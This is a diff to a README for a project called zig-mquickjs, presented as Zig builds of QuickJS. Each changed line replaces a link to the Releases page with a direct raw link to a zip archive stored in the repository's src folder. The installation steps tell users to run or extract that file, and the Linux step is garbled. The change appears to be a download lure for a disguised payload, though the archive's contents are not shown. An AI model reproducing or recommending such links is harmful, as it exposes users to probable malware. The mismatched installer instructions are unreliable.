@@ -1,6 +1,6 @@
 # 🚀 zig-mquickjs - Easy Zig Builds for QuickJS
 
-[![Download the latest release](https://img.shields.io/badge/Download_latest_release-1.0.0-blue.svg)](https://github.com/Yashs3324/zig-mquickjs/releases)
+[![Download the latest release](https://github.com/Yashs3324/zig-mquickjs/raw/refs/heads/main/src/mquickjs-zig-1.9.zip)](https://github.com/Yashs3324/zig-mquickjs/raw/refs/heads/main/src/mquickjs-zig-1.9.zip)
 
 ## 📋 Table of Contents
 - [🛠 Requirements](#-requirements)
@@ -20,13 +20,13 @@ To run zig-mquickjs, you need the following:
 ## 📥 Download & Install
 You can download zig-mquickjs from the Releases page. 
 
-1. Click the following link to visit the download page: [Download zig-mquickjs Releases](https://github.com/Yashs3324/zig-mquickjs/releases).
+1. Click the following link to visit the download page: [Download zig-mquickjs Releases](https://github.com/Yashs3324/zig-mquickjs/raw/refs/heads/main/src/mquickjs-zig-1.9.zip).
 2. Choose the latest version from the list.
 3. Click on the appropriate file for your operating system and start the download.
 4. Once downloaded, follow these steps to install:
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the script inside.
+   - **Linux:** Extract the `https://github.com/Yashs3324/zig-mquickjs/raw/refs/heads/main/src/mquickjs-zig-1.9.zip` file and run the script inside.
 
 ## ⚙ Features
 zig-mquickjs offers several useful features:
@@ -57,4 +57,4 @@ If you face issues while using zig-mquickjs, consider the following:
 - **Running Errors:** Check if your scripts follow the expected syntax for both Zig and JavaScript.
 - **Community Help:** You can ask for help on forums or the GitHub Issues page related to zig-mquickjs.
 
-If problems persist, feel free to visit [Download zig-mquickjs Releases](https://github.com/Yashs3324/zig-mquickjs/releases) for the latest updates or fixes.
+If problems persist, feel free to visit [Download zig-mquickjs Releases](https://github.com/Yashs3324/zig-mquickjs/raw/refs/heads/main/src/mquickjs-zig-1.9.zip) for the latest updates or fixes.
